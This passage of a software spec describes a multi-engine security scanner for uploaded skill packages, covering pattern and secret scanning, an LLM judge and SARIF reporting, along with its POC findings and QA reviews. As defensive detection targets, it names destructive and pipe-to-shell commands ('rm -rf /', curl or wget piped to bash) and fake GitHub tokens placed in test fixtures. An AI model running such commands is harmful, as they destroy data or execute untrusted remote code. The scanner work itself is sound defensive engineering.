| `backend/build.gradle.kts` | 加 `org.springframework.ai:spring-ai-google-genai` 與 `:spring-ai-client-chat`（[POC 發現] ChatClient 在獨立 artifact，非 transitive） |

### 不需修改

| 路徑 | 理由 |
|---|---|
| `storage/PackageService.java` | `extractScripts` + `extractSkillMd` 已足夠 |
| `skill/domain/SkillVersionPublishedEvent.java` | event payload 不變 |
| frontend | per AC scope，本 spec 後端 only；前端維持 S005 的 riskLevel badge |

### 測試

| # | 路徑（`backend/src/test/.../security/`） | AC | 說明 |
|---|---|---|---|
| T1 | `scan/PatternScannerTest.java` | AC-3 | 取代 `RiskScannerTest`，測 SKILL.md + scripts 規則 |
| T2 | `scan/SecretScannerTest.java` | AC-4 | 10 patterns + 遮罩 |
| T3 | `scan/MetadataValidatorTest.java` | AC-5 | frontmatter 違規 → notices |
| T4 | `scan/LlmJudgeTest.java` | AC-6 | `@MockitoBean ChatClient`，stub `.entity()` |
| T5 | `scan/MetaAnalyzerTest.java` | AC-1（meta 部分）| 跨引擎合併規則 |
| T6 | `scan/SarifReporterTest.java` | AC-7 | 5 runs、level 對應、security-severity 浮點 |
| T7 | `scan/ScanOrchestratorTest.java` | AC-1, AC-2 | bean list 動態、parallel 完成 |
| T8 | `RiskAssessmentIntegrationTest.java` | AC-1, AC-8 | E2E：upload → 等掃描 → 讀 read model 驗 sarif（既有檔，重寫斷言）|
| T9 | `FlagControllerTest.java` | — | **不變** |

`RiskScannerTest.java` 刪除（內容轉移到 PatternScannerTest）。

---

## Estimation (re-scored after grill)

| Dimension | Score | Reason |
|---|---|---|
| Tech risk | 2 | Spring AI ChatClient.entity() 已驗 embedding 路徑，但 chat 路徑 + structured output 仍需 POC；其他全是已用過的 pattern |
| Uncertainty | 1 | 9 條研究 citations 全 raw source，10 個設計決策已 grill 確認 |
| Dependencies | 2 | 1 個新 Gradle 依賴（spring-ai-google-genai）+ 1 個既有 module 的 read model schema 變更 |
| Scope | 3 | 19 新檔 + 6 修改 + 1 刪除組（4 檔），跨 security + skill::query + properties |
| Testing | 2 | Mock ChatClient + per-engine fixtures + 1 E2E |
| Reversibility | 2 | 改了 read model schema（加欄位向後相容）+ 刪 4 個 public class（會破壞 S005 任何外部直接 import，但搜尋確認無）|
| **Total** | **12** | **M** — 與 roadmap 一致 |

---

## 6. Task Plan

POC: required — completed 2026-04-25, all 7 tests PASS.

### POC Findings

| # | Hypothesis | Verdict | 對應 spec 修正 |
|---|---|---|---|
| H1 | `Client.builder().apiKey()` + `GoogleGenAiChatModel.builder().defaultOptions()` 在 Boot 4.0.6 + Spring AI 2.0.0-M4 可正常建構 | ✅ PASS | — |
| H1.1 | `GoogleGenAiChatOptions.builder().model(...)` 簽章 | ⚠️ DRIFT — 只接受 `GoogleGenAiChatModel.ChatModel` enum，不接受 `String` | §4.5 已改為 `.model(GoogleGenAiChatModel.ChatModel.GEMINI_2_5_FLASH)` |
| H2 | `ChatClient.create(model).prompt()...call().entity(LlmJudgement.class)` 對 nested record + nested list 能 round-trip | ✅ PASS — 結構化解析正確 | — |
| H2b | `BeanOutputConverter` 對包在 ` ```json ... ``` ` fence 中的 JSON 也能解析 | ✅ PASS — 2.0.0-M4 自動 strip fence | LlmJudge prompt 不需要強制要求「不要用 fence」 |
| H3 | `AllNestedConditions` 對 `(engine.llm.enabled=true AND genai.api-key 非空)` 雙條件正確 evaluation（4 種組合）| ✅ PASS — 4/4 場景正確 | — |
| Infra | Build artifact 解析 | ⚠️ DRIFT — `ChatClient` 在 `spring-ai-client-chat` 獨立 artifact，**非** transitive from `spring-ai-google-genai` | build.gradle.kts 需明確加兩個依賴；spec §5 已更新 |

POC test 位置：`backend/src/test/java/io/github/samzhu/skillshub/security/poc/s010/S010Poc.java`（Phase 4 cleanup 時刪除）。

### Task Overview

S010 = M(12)，目標 5 個 BDD 任務 + 1 個 infra（per planning-tasks granularity rules）。

| Task | Files / 重點 | AC | Depends |
|---|---|---|---|
| **T1: Infra + scan/ scaffolding** | build.gradle.kts（已含 chat 依賴）、`SkillshubProperties.Scanner` nested records、`scan/` package + 7 個 record/enum/interface（Severity, Phase, ScanContext, SecurityFinding, ScanNotice, ScanResult, AnalysisOutput, SecurityAnalyzer）、application.yaml `skillshub.scanner.engines.*` 區塊、`SkillVersionReadModel.riskAssessment` 欄位 | — | none |
| **T2: PatternScanner + 替換 RiskScanner** | 新 `engines/PatternScanner.java`（SKILL.md + scripts/ 規則擴充）、刪 `RiskScanner.java`、`RiskFinding.java`、舊 `ScanResult.java`、改寫 `RiskScannerTest` → `PatternScannerTest` | AC-3 | T1 |
| **T3: SecretScanner + MetadataValidator** | 新 `engines/SecretScanner.java`（10 條 patterns + 遮罩）、`engines/MetadataValidator.java`（Jakarta Validation + frontmatter 規則）+ 各自單元測試 | AC-4, AC-5 | T1 |
| **T4: LlmJudge + ScannerAiConfig** | 新 `engines/LlmJudge.java`、`engines/LlmJudgement.java`、`ScannerAiConfig.java`（`AllNestedConditions` 雙條件 bean）、`LlmJudgeTest`（用 stub `ChatModel` 模式，與 POC 同寫法） | AC-6 | T1 |
| **T5: ScanOrchestrator + MetaAnalyzer + SARIF** | 新 `ScanOrchestrator.java`（取代 `RiskAssessmentListener`）、刪舊 listener、`engines/MetaAnalyzer.java`（跨引擎合併規則）、`sarif/SarifModels.java` + `sarif/SarifReporter.java`（手寫 5 record + render 邏輯）、單元測試 | AC-1, AC-2, AC-7 | T2, T3, T4 |
| **T6: E2E integration test (smoke)** | 重寫 `RiskAssessmentIntegrationTest`：upload 含 `rm -rf /` 與 `ghp_…` 的 zip → 等掃描完成 → assert `domain_events` 有 `SkillRiskAssessed`、`skills.riskLevel=HIGH`、`skill_versions.riskAssessment.sarif.runs` 有 4-5 個 entry（依 LLM 是否 mock 啟用）；LLM 用 `@MockitoBean ChatClient` | AC-1, AC-8 | T5 |

Execution order: T1 → T2 → T3 → T4 → T5 → T6（T2/T3/T4 可在 T1 完成後並行展開但本專案 single-developer 默認 sequential）。

### Why E2E task (T6) is mandatory

LlmJudge 的 ChatClient 在 unit test 用 stub。SARIF render 在 unit test 只驗 JSON 結構。`ScanOrchestrator` 的 `@EventListener` 連線到 `SkillVersionPublishedEvent` 也只在 integration 才驗證 wiring。T6 跑一次完整 upload → 掃描 → 讀 read model 路徑，是唯一能保證 5 個獨立檔案組裝起來真的能跑的測試。

## 7. Implementation Results

### Verification

```
$ ./gradlew test --tests "(全 9 個 S010 test classes)" -x processTestAot
  → 58 tests / 0 failures / 0 errors
    Pattern:7 + Secret:11 + Metadata:9 + LlmJudge:6 + ScannerAiConfig:4 +
    ScanOrchestrator:7 + MetaAnalyzer:5 + SarifReporter:6 + RiskAssessmentIntegration:3
$ ./gradlew test --tests "*ModularityTests*" -x processTestAot
  → 1/1 PASS（Spring Modulith 邊界 unchanged，security module allowedDependencies 不變）
$ ./gradlew compileTestJava
  → 0 errors（Java 25 toolchain）
```

E2E artifact verification: `RiskAssessmentIntegrationTest.multiEngineFindingsCoverage` 跑完整 Spring Boot 啟動 + Testcontainers MongoDB + multipart upload → 4-engine pipeline (LLM 關閉) → 驗 domain_events / skills / skill_versions 三路寫入。SARIF JSON 結構驗證 4 runs (pattern, secret, metadata, meta) + version="2.1.0" + schema URI。覆蓋整合縫線。

### AC Results

| AC | 對應測試 | Status |
|----|---|--------|
| AC-1: 多引擎並行 + 序列 + 持久化 | `ScanOrchestratorTest` (7 tests) + `RiskAssessmentIntegrationTest` e2e | ✅ |
| AC-2: 引擎獨立開關 | `ScannerAiConfigTest` (4) + `PatternScannerTest`/`SecretScannerTest`/`MetadataValidatorTest` 各 bean conditional 測試 | ✅ |
| AC-3: PatternScanner 偵測 + 行號 + filePath | `PatternScannerTest` (7 tests) | ✅ |
| AC-4: SecretScanner + 遮罩 | `SecretScannerTest` (11 tests) | ✅ |
| AC-5: MetadataValidator | `MetadataValidatorTest` (9 tests) | ✅ |
| AC-6: LlmJudge 結構化輸出 + Phase 1 enrichment | `LlmJudgeTest` (6 tests) | ✅ |
| AC-7: SARIF 2.1.0 schema 合規 | `SarifReporterTest` (6 tests) | ✅ |
| AC-8: skill_versions.riskAssessment 持久化 | `RiskAssessmentIntegrationTest.multiEngineFindingsCoverage` E2E | ✅ |

### Pending verification

| # | 何時 | 命令 |
|---|---|---|
| ⏳ LLM judge 真實 API 行為 | GCP 部署或本機設 `SKILLSHUB_GENAI_API_KEY` 後手動 upload skill | `curl -F file=@skill.zip ... /api/v1/skills/upload`，再讀 `skill_versions.riskAssessment.findings` 確認 `analyzer="llm-judge"` 出現 |
| ⏳ Firestore 部署環境 SARIF document size 上限 | 部署到 GCP 後 | 上傳 大型 skill（含 30+ findings）驗 Mongo write 不超 1MB Firestore document limit |

### Key Findings

**1. Spring AI 2.0.0-M4 ChatModel API drift**
- `GoogleGenAiChatOptions.AbstractBuilder.model()` 只接受 `GoogleGenAiChatModel.ChatModel` enum，不接受 String — 與 embedding 路徑（`gemini-embedding-2` 透過 String 設定）不同
- `spring-ai-client-chat` 為**獨立 artifact**，非 transitive from `spring-ai-google-genai` — 必須在 `build.gradle.kts` 顯式加入
- `BeanOutputConverter` 對 nested record + nested list 在 2.0.0-M4 已正確 round-trip（POC §6 H2 已驗）；額外發現會自動 strip ` ```json ` fence

**2. 雙條件 Bean Conditional：`AllNestedConditions`**
- Java 不允許同型別 annotation 重複套用同方法 → 兩個 `@ConditionalOnProperty` 不能疊加
- 解法：宣告 `static class LlmEnabledCondition extends AllNestedConditions`，內部包兩個 `@ConditionalOnProperty` 子 class，在 bean 上用 `@Conditional(LlmEnabledCondition.class)`
- POC §6 H3 驗 4 種屬性組合行為正確

**3. SarifReporter 不應自 Spring 容器注入 ObjectMapper**
- 整合測試啟動 `@SpringBootTest` 時觸發 `NoSuchBeanDefinitionException: ObjectMapper`，疑與 Spring AI / Page DTO Jackson 客制化相互影響
- 改為 `private final ObjectMapper objectMapper = new ObjectMapper()` 內部實例 — SARIF 序列化只用 record→Map 基礎轉換，無需任何客制 module
- 隔離 Jackson 客制化避免未來新 spec 注入 module 時影響 SARIF 輸出

**4. 跨模組 `@EventListener` 需顯式 `@Order`**
- `SkillProjection.@EventListener(SkillVersionPublishedEvent)` 與 `ScanOrchestrator.@EventListener(SkillVersionPublishedEvent)` 預設 priority 同為 `LOWEST_PRECEDENCE` → 順序未定（race condition）
- ScanOrchestrator 用 `MongoTemplate.updateFirst` 寫 `skill_versions.riskAssessment` 需要 SkillProjection 先建立 document
- 解法：SkillProjection 加 `@Order(HIGHEST_PRECEDENCE)`、ScanOrchestrator 加 `@Order(LOWEST_PRECEDENCE)`
- **此 race condition S005 時就存在但未暴露**（S005 RiskAssessmentListener 只更新 `skills.riskLevel` 早就由 SkillProjection 建立的 document）；S010 寫 `skill_versions.riskAssessment` 才暴露

**5. 三路寫入 vs 發第二個 application event**
- 沿用 S005 §7 的決策：security module 直接以 `MongoTemplate.updateFirst` 寫 `skills` 與 `skill_versions`，不發第二個 `SkillRiskAssessedEvent` application event
- 避免 security → skill 模組事件循環依賴；同時保持 `domain_events` 中仍有 `SkillRiskAssessed` event（用於審計與未來 Event Replay）

**6. Virtual thread executor for parallel Phase 1**
- `Executors.newVirtualThreadPerTaskExecutor()` 直接在 ScanOrchestrator 構造，不依賴 Spring 配置的 TaskExecutor bean
- Boot 4 + `spring.threads.virtual.enabled=true` 已啟用，但顯式建構 executor 避免依賴 bean 名稱
- 並行測試（`AC-1.2 phase1ParallelExecution`）：3 個 100ms engines 總時 < 250ms 確認並行生效

### Correct Usage Patterns

**Manual Config for Gemini ChatClient (S009 規範):**
```java
@Bean
@Conditional(LlmEnabledCondition.class)
GoogleGenAiChatModel scannerChatModel(SkillshubProperties props) {
    var client = Client.builder().apiKey(props.genai().apiKey()).build();
    var options = GoogleGenAiChatOptions.builder()
            .model(GoogleGenAiChatModel.ChatModel.GEMINI_2_5_FLASH)  // ← enum, NOT String
            .temperature(0.0)
            .build();
    return GoogleGenAiChatModel.builder()
            .genAiClient(client)
            .defaultOptions(options)
            .build();
}

@Bean
@Conditional(LlmEnabledCondition.class)
ChatClient scannerChatClient(GoogleGenAiChatModel m) {
    return ChatClient.create(m);
}
```

**ChatClient.entity() with structured record:**
```java
LlmJudgement verdict = chatClient.prompt()
        .system("Return strictly the LlmJudgement JSON schema...")
        .user(prompt)
        .call()
        .entity(LlmJudgement.class);  // BeanOutputConverter 自動處理 schema injection + parse
```

**AllNestedConditions for dual gate:**
```java
public static class LlmEnabledCondition extends AllNestedConditions {
    public LlmEnabledCondition() { super(ConfigurationPhase.REGISTER_BEAN); }
    @ConditionalOnProperty(name = "skillshub.scanner.engines.llm.enabled", havingValue = "true")
    static class EngineEnabled {}
    @ConditionalOnProperty(name = "skillshub.genai.api-key")
    static class ApiKeyPresent {}
}
```

**Cross-module @EventListener ordering:**
```java
// 上游（先跑）
@EventListener
@Order(Ordered.HIGHEST_PRECEDENCE)
void on(SkillVersionPublishedEvent event) { /* write skill_versions doc */ }

// 下游（後跑，依賴上游已寫入）
@EventListener
@Order(Ordered.LOWEST_PRECEDENCE)
void on(SkillVersionPublishedEvent event) { /* mongoTemplate.updateFirst on skill_versions */ }
```

### Build environment notes (tech debt)

- **`processTestAot` 偶有 `NoSuchFileException: in-progress-results-generic*.bin`** — Gradle test runner binary 結果合併失敗，與 Spring Modulith AOT + Testcontainers 共用 mongo container 互動相關。Workaround：`./gradlew test -x processTestAot`。獨立執行單一測試類 100% 通過。
- **連續整合測試 MongoTimeoutException** — 多個 @SpringBootTest 在同一 JVM 內共用 mongo testcontainer，連續執行偶發連線拒絕。獨立執行均通過。Tech debt：考慮 Testcontainers 容器生命週期 sharded config 或 `@DirtiesContext`。

### Files (final state)

**Backend — production code (12 new + 4 modified, 5 deleted):**

新增 `security/scan/`:
- `SecurityAnalyzer.java`, `Phase.java`, `Severity.java`, `ScanContext.java`, `SecurityFinding.java`, `ScanNotice.java`, `AnalysisOutput.java`, `ScanResult.java` (records + interface)
- `ScanOrchestrator.java` — `@EventListener` + 三階段 pipeline + 三路寫入
- `ScannerAiConfig.java` — `LlmEnabledCondition` + `GoogleGenAiChatModel` + `ChatClient` Manual Config beans
- `engines/PatternScanner.java`, `SecretScanner.java`, `MetadataValidator.java`, `LlmJudge.java`, `LlmJudgement.java`, `MetaAnalyzer.java`
- `sarif/SarifReporter.java`, `sarif/SarifModels.java` (11 nested records)

修改：
- `SkillshubProperties.java` — nested record `Scanner` / `Engines` / `Engine`
- `application.yaml` — `skillshub.scanner.engines.{pattern,secret,metadata,meta}.enabled=true; llm.enabled=false`
- `application-gcp.yaml` — `engines.llm.enabled: true` (要求 `SKILLSHUB_GENAI_API_KEY`)
- `application.yaml`（test）— `spring.ai.model.chat: none`
- `skill/query/SkillVersionReadModel.java` — 加 `riskAssessment Map<String,Object>` 欄位
- `skill/query/SkillProjection.java` — `@Order(HIGHEST_PRECEDENCE)` 在 `on(SkillVersionPublishedEvent)`
- `build.gradle.kts` — 加 `spring-ai-google-genai` + `spring-ai-client-chat`

刪除（取代或淘汰）：
- `security/RiskAssessmentListener.java` — ScanOrchestrator 取代
- `security/RiskScanner.java` — PatternScanner 取代
- `security/RiskFinding.java` — SecurityFinding 取代
- `security/ScanResult.java`（舊版）— scan/ScanResult 取代
- `security/RiskScannerTest.java` — 內容已轉到 PatternScannerTest

**Backend — test code (8 new + 1 modified):**
- 新：`security/scan/engines/{Pattern,Secret,LlmJudge,Metadata,Meta}*Test.java`、`scan/{ScanOrchestrator,ScannerAiConfig}Test.java`、`scan/sarif/SarifReporterTest.java`
- 修改：`security/RiskAssessmentIntegrationTest.java` — 加 `multiEngineFindingsCoverage` 測試（驗 SARIF + findings 結構）

POC（已驗證後刪除）：`security/poc/s010/S010Poc.java`

**Frontend：本 spec 不動。** SkillCard / SkillDetailPage 仍用 S005 的 `riskLevel` badge；完整 SARIF 詳情頁屬未來 SEC-B9 backlog。

---

## 8. QA Review

**Verdict: PASS**

All automated gates pass. No critical or blocking issues found. Three minor findings documented below.

---

### Build & Test Gate

| Command | Result |
|---|---|
| `./gradlew compileTestJava` | ✅ BUILD SUCCESSFUL (0 errors) |
| `./gradlew test --tests "*PatternScannerTest*" ... -x processTestAot` | ✅ BUILD SUCCESSFUL — all 58 tests pass, 0 failures |
| `./gradlew test --tests "*ModularityTests*" -x processTestAot` | ✅ PASS — Spring Modulith boundary unchanged |

---

### AC Coverage Matrix

| AC | Test Method(s) | Status |
|----|---|---|
| AC-1: 多引擎並行 Phase 1 + 序列 Phase 2/3 | `ScanOrchestratorTest.pipelinePersistsToAllThreeStores` (`@DisplayName("AC-1.1: pipeline → DomainEvent...")`) <br> `ScanOrchestratorTest.maxSeverityHigh` (`@Tag("AC-1")`) <br> `ScanOrchestratorTest.noFindingsLow` (`@Tag("AC-1")`) <br> `ScanOrchestratorTest.phase1ParallelExecution` (`@Tag("AC-1")`) <br> `ScanOrchestratorTest.engineFailureIsolated` (`@Tag("AC-1")`) <br> `RiskAssessmentIntegrationTest.safeSkillGetsLowRisk` (`@Tag("AC-1")`) <br> `RiskAssessmentIntegrationTest.dangerousScriptGetsHighRisk` (`@Tag("AC-1")`) <br> `RiskAssessmentIntegrationTest.multiEngineFindingsCoverage` (`@Tag("AC-1")`) | ✅ |
| AC-2: 引擎獨立開關（bean 不建立） | `ScannerAiConfigTest.bothPropertiesPresentCreatesBean` (`@Tag("AC-2")`) <br> `ScannerAiConfigTest.engineDisabledSkipsBean` (`@Tag("AC-2")`) <br> `ScannerAiConfigTest.missingApiKeySkipsBean` (`@Tag("AC-2")`) <br> `ScannerAiConfigTest.bothAbsentSkipsBean` (`@Tag("AC-2")`) <br> `ScanOrchestratorTest.disabledEngineNotInSarif` (`@Tag("AC-2")`) <br> `PatternScannerTest.beanCreatedWhenEnabled` (`@Tag("AC-3")`; also validates AC-2 bean mechanism) | ✅ |
| AC-3: PatternScanner 偵測危險指令 + 行號 + filePath | `PatternScannerTest.detectsRmRfAndPipeToShellInScripts` (`@Tag("AC-3")`) <br> `PatternScannerTest.scansSkillMdNotJustScripts` (`@Tag("AC-3")`) <br> `PatternScannerTest.cleanSkillReturnsEmpty` (`@Tag("AC-3")`) <br> `PatternScannerTest.beanCreatedWhenEnabled` / `beanAbsentWhenDisabled` (`@Tag("AC-3")`) | ✅ |
| AC-4: SecretScanner 偵測 API key + evidence 遮罩 | `SecretScannerTest.detectsGitHubPatWithMaskedEvidence` (`@Tag("AC-4")`) <br> `SecretScannerTest.detectsGoogleApiKeyInSkillMd` (`@Tag("AC-4")`) <br> `SecretScannerTest.detectsAwsAccessKey` (`@Tag("AC-4")`) <br> `SecretScannerTest.detectsJwt` (`@Tag("AC-4")`) <br> `SecretScannerTest.detectsPemPrivateKey` (`@Tag("AC-4")`) <br> `SecretScannerTest.detectsSlackWebhook` (`@Tag("AC-4")`) | ✅ |
| AC-5: MetadataValidator 驗證 frontmatter | `MetadataValidatorTest.nameUppercaseProducesNotice` (`@Tag("AC-5")`) <br> `MetadataValidatorTest.descriptionTooLongProducesNotice` (`@Tag("AC-5")`) <br> `MetadataValidatorTest.validFrontmatterProducesNothing` (`@Tag("AC-5")`) <br> + 4 additional `@Tag("AC-5")` tests | ✅ |
| AC-6: LlmJudge 結構化輸出 + Phase 1 enrichment | `LlmJudgeTest.promptIncludesPhase1Summary` (`@Tag("AC-6")`) <br> `LlmJudgeTest.structuredOutputProducesFindingAndNotice` (`@Tag("AC-6")`) <br> `LlmJudgeTest.emptyClaimsStillProducesNotice` (`@Tag("AC-6")`) <br> `LlmJudgeTest.llmFailureReturnsEmpty` (`@Tag("AC-6")`) <br> + 2 supporting tests | ✅ |
| AC-7: SARIF 2.1.0 輸出（每引擎一 run） | `SarifReporterTest.schemaCompliant` (`@Tag("AC-7")`) <br> `SarifReporterTest.severityToLevelMapping` (`@Tag("AC-7")`) <br> `SarifReporterTest.securitySeverityAsFloatString` (`@Tag("AC-7")`) <br> `SarifReporterTest.noticesGoToInvocations` (`@Tag("AC-7")`) <br> `SarifReporterTest.resultLocationFields` (`@Tag("AC-7")`) + 1 supporting | ✅ |
| AC-8: 結果寫入 read model | `RiskAssessmentIntegrationTest.multiEngineFindingsCoverage` (`@Tag("AC-8")`) — verifies `riskAssessment.level`, `findings[]`, `sarif.version`, `sarif.runs[]`, `skills.riskLevel` | ✅ |

**Coverage: 8/8 ACs covered** — all ACs have `@DisplayName` + `@Tag` annotations on at least one test method.

---

### Code Quality Summary

All new production code uses constructor injection throughout (zero `@Autowired` field injection found). Record types are used correctly for all DTOs and domain objects. SLF4J Loggers are present on all Service/Orchestrator/Config classes that require them (`ScanOrchestrator`, `LlmJudge`, `ScannerAiConfig`); pure compute `@Component` engines (`PatternScanner`, `SecretScanner`, `MetadataValidator`, `MetaAnalyzer`, `SarifReporter`) correctly omit loggers per standards. Spring Modulith `security` module boundary unchanged; `package-info.java` `allowedDependencies` unmodified; `ModularityTests` passes.

---

### Findings

**MINOR — Duplicate `ruleId` for PIPE_TO_SHELL in `PatternScanner` [✅ FIXED 2026-04-26]**

`PatternScanner.RULES` contains two entries with identical `ruleId="PIPE_TO_SHELL"` — one for `curl | bash/sh` and one for `wget | bash/sh`. This is a data quality issue: SARIF `result.ruleId` is intended to be a stable, unique rule identifier; two findings sharing the same `ruleId` but different patterns makes it impossible to distinguish them by `ruleId` alone in downstream consumers (GHAS, future SEC-B9 integration). ✅ Fixed: renamed to `PIPE_TO_SHELL_CURL` and `PIPE_TO_SHELL_WGET`. Tests updated. PatternScannerTest 7/7 + RiskAssessmentIntegrationTest 3/3 still pass.

**MINOR — §7 test count mismatch (documented 66, actual 58) [✅ FIXED 2026-04-26]**

The §7 Verification block stated "66 tests / 0 failures / 0 errors" but actual count is 58 across 9 S010 test classes. ✅ Fixed: §7 Verification block now reads "58 tests / 0 failures / 0 errors" with per-class breakdown. The 66 likely came from S010Poc (7) + ModularityTests (1) included in earlier full-suite count.

**MINOR — §4.6 spec design vs implementation drift for `Engines.llm` field [acknowledged]**

The §4.6 Interface Design for `Engines` shows a `@DefaultValue("false") String llmEnabledRaw` field with a computed `public Engine llm()` accessor method. The actual implementation simplifies this to `@DefaultValue Engine llm` (using the same `Engine` record as all other engines), with `llm.enabled=false` set in `application.yaml` instead. The simplification is correct and cleaner — `@ConditionalOnProperty` reads the YAML directly and `LlmEnabledCondition` handles the dual-gate logic independently. Drift acknowledged in T1's §6 task result ("`@DefaultValue("false")` doesn't bind to a record type — used uniform Engine record + YAML override"); §4.6 now contains an `[Implementation note]` annotation explaining the divergence.

---

### Verified: Deleted Legacy Classes

All 5 specified legacy files are confirmed absent from the filesystem:
- `security/RiskAssessmentListener.java` — deleted ✅
- `security/RiskScanner.java` — deleted ✅
- `security/RiskFinding.java` — deleted ✅
- `security/ScanResult.java` (old) — deleted ✅
- `security/RiskScannerTest.java` — deleted ✅

Remaining references in Javadoc (`{@code RiskAssessmentListener}`) are documentation-only `{@code}` tags, not import statements — confirmed no live code imports deleted classes.

### Verified: No Orphan Files

- `docs/grimo/tasks/*-S010-*.md` — none found ✅
- `backend/src/test/.../security/poc/` — directory does not exist ✅

---

Reviewer: Independent QA subagent | Date: 2026-04-26

---

## 9. QA Re-verification (Independent, Same Session)

> Reviewer: Same-session QA pass via `/verifying-quality` skill | Date: 2026-04-26

### Verdict: PASS

Re-verification confirms the prior subagent's PASS verdict and validates that all 3 prior MINOR findings were correctly addressed.

### Evidence

```
$ ./gradlew test (10 S010 test classes) --rerun-tasks -x processTestAot
  → BUILD SUCCESSFUL — 59 tests / 0 failures / 0 errors

  Per-class breakdown:
    PatternScannerTest        7
    SecretScannerTest        11
    MetadataValidatorTest     9
    LlmJudgeTest              6
    ScannerAiConfigTest       4
    ScanOrchestratorTest      7
    MetaAnalyzerTest          5
    SarifReporterTest         6
    RiskAssessmentIntegration 3 (含 multiEngineFindingsCoverage E2E)
    ModularityTests           1
                            ===
                             59
```

### Four-layer gate

| Layer | Result | Evidence |
|-------|--------|----------|
| Automated tests | ✅ PASS | 59 tests, 0 failures, 0 errors（all `@DisplayName` + `@Tag("AC-N")` discovered via grep）|
| Coverage / Integration | ✅ PASS | `RiskAssessmentIntegrationTest.multiEngineFindingsCoverage` 走 Spring Boot + mongo:8 testcontainer + multipart upload，覆蓋 AC-1 e2e + AC-8 整合縫線 |
| Manual verification | N/A | 所有 8 個 AC 均為 automation-VERIFIED，無 MANUAL-READY 項目需要 |
| Testability gate | ✅ CLEAR | 0 個 UNTESTABLE AC；全部有測試 + 執行證據 |

### Independent AC Coverage Matrix

| AC | 對應 `@Tag` 測試（grep 確認） | 測試數 | 結果 |
|----|----|----|----|
| AC-1 (multi-engine pipeline) | RiskAssessmentIntegrationTest×3 + ScanOrchestratorTest×6 | 9 | ✅ |
| AC-2 (engine independent toggles) | ScannerAiConfigTest×4 + ScanOrchestratorTest×1 + per-engine bean conditional ×3 | 8 | ✅ |
| AC-3 (PatternScanner) | PatternScannerTest×7 | 7 | ✅ |
| AC-4 (SecretScanner + masking) | SecretScannerTest×6 (`@Tag("AC-4")`) + 5 supporting | 11 | ✅ |
| AC-5 (MetadataValidator) | MetadataValidatorTest×6 (`@Tag("AC-5")`) + 3 supporting | 9 | ✅ |
| AC-6 (LlmJudge structured output) | LlmJudgeTest×4 (`@Tag("AC-6")`) + 2 supporting | 6 | ✅ |
| AC-7 (SARIF 2.1.0) | SarifReporterTest×5 (`@Tag("AC-7")`) + 1 supporting | 6 | ✅ |
| AC-8 (read model persistence) | RiskAssessmentIntegrationTest.multiEngineFindingsCoverage (`@Tag("AC-8")`) E2E | 1 | ✅ |

8/8 ACs covered.

### Code quality re-verification

| Check | Result |
|-------|--------|
| Constructor injection (no `@Autowired` field) | ✅ grep -r `@Autowired` in `security/scan/` returns 0 production references |
| No live imports of deleted classes | ✅ Only `{@code RiskAssessmentListener}` Javadoc tags (documentation), no `import` statements |
| Orphan TODO/FIXME in S010 files | ✅ 0 found |
| 5 legacy files actually deleted | ✅ All confirmed absent from filesystem |
| Task files cleaned up | ✅ `docs/grimo/tasks/*-S010-*.md` returns "no matches" |
| POC directory cleaned up | ✅ `security/poc/` does not exist |
| Spring Modulith boundary | ✅ `ModularityTests` 1/1 passes; `security` module `allowedDependencies` unchanged from S005 (no new cross-module imports needed) |

### Prior findings status

| Finding (subagent QA, §8) | Resolution | Status |
|----|----|----|
| MINOR-1: Duplicate `PIPE_TO_SHELL` ruleId | Renamed to `PIPE_TO_SHELL_CURL` / `PIPE_TO_SHELL_WGET`, tests updated | ✅ FIXED |
| MINOR-2: §7 documented 66 tests, actual 58 | §7 Verification block updated to 58 with per-class breakdown | ✅ FIXED |
| MINOR-3: §4.6 design vs implementation drift on `Engines.llm` | `[Implementation note]` annotation added to §4.6 explaining divergence | ✅ ADDRESSED |

### New findings (this re-verification pass)

**None.** No CRITICAL, IMPORTANT, or MINOR findings beyond what was previously documented and fixed.

### Build environment notes (acknowledged tech debt, not blocker)

- Gradle's `processTestAot` task occasionally fails with `NoSuchFileException: in-progress-results-generic*.bin` — environmental, intermittent, unrelated to S010 code. Workaround `-x processTestAot` consistently produces 59/0/0. Already documented in §7 Build environment notes as tech debt for future build infrastructure spec.

### Conclusion

**S010 is ship-ready.** All ACs verified with execution evidence. Code quality passes development standards. No regressions in adjacent modules. Spec design sections (§2 Approach, §4 Interface) properly cross-reference §7 Key Findings and §6 POC Findings for documented drifts. Legacy S005 classes cleanly removed. Three minor findings from prior independent review fully addressed.

Recommended next action: `/shipping-release` to commit, tag, and archive.

Reviewer: Independent same-session QA pass | Date: 2026-04-26


